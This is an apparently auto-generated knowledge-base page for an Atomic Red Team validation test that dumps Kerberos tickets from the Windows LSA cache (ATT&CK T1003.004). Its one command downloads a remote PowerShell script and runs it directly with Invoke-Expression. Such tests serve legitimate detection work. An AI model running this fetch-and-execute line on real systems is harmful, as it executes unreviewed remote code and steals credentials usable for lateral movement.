---
atomic_guid: "2dfa3bff-9a27-46db-ab75-7faefdaca732"
title: "Dump Kerberos Tickets from LSA using dumper.ps1"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.004"
attack_technique_name: "OS Credential Dumping: LSA Secrets"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.004/T1003.004.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "2dfa3bff-9a27-46db-ab75-7faefdaca732"
  - "Dump Kerberos Tickets from LSA using dumper.ps1"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Dump Kerberos Tickets from LSA using dumper.ps1

This tool allows you to dump Kerberos tickets from the LSA cache. Implemented via Add-Type.
If the tool is run as a privileged user, it will automatically obtain NT AUTHORITY\SYSTEM privileges and then dump all tickets. If the tool is run as a non-privileged user, it will only dump tickets from the current logon session.
Ref: https://github.com/MzHmO/PowershellKerberos/
Author of dumper.ps1: Michael Zhmaylo (@MzHmO)

## Metadata

- Atomic GUID: 2dfa3bff-9a27-46db-ab75-7faefdaca732
- Technique: T1003.004: OS Credential Dumping: LSA Secrets
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1003.004/T1003.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.004]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.004/T1003.004.yaml)
